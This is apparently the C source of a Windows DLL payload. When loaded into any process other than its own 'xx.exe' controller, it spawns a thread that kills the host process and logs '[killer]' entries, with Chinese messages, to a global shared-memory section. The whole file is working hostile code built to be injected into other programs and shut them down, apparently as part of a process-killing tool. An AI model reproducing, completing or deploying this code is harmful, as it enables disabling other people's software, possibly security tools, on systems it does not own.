#include <windows.h>
#include <stdio.h>
#include <stdarg.h>

#define SHARED_MEM_NAME  L"Global\\xx_shared_mem"
#define SHARED_MEM_SIZE  4096
#define OFFSET_LOG       256
#define LOG_SIZE         3808

static void WriteKillerLog(const WCHAR *fmt, ...) {
    HANDLE hMap = OpenFileMappingW(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, SHARED_MEM_NAME);
    if (!hMap) return;
    PVOID pView = MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
    if (!pView) { CloseHandle(hMap); return; }

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, fmt);
    _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [killer] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    WCHAR *pLog = (WCHAR *)((BYTE *)pView + OFFSET_LOG);
    size_t len = wcslen(pLog);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t newLen = wcslen(entry);
    if (len + newLen < maxLen) {
        wcscat_s(pLog, maxLen - len, entry);
    } else {
        memmove(pLog, pLog + newLen, (maxLen - newLen) * sizeof(WCHAR));
        wcscpy_s(pLog + (maxLen - newLen), newLen, entry);
    }

    UnmapViewOfFile(pView);
    CloseHandle(hMap);
}

DWORD WINAPI PayloadThread(LPVOID lp) {
    Sleep(100);
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    const WCHAR *base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    DWORD pid = GetCurrentProcessId();
    WriteKillerLog(L"Payload 触发，准备结束自身进程: %s PID=%lu", base, pid);
    TerminateProcess(GetCurrentProcess(), 0);
    WriteKillerLog(L"TerminateProcess 返回 (未生效?) PID=%lu", pid);
    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        DWORD pid = GetCurrentProcessId();

        if (wcsstr(path, L"xx.exe")) {
            WriteKillerLog(L"跳过自身 xx.exe PID=%lu", pid);
            return TRUE;
        }
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    return TRUE;
}
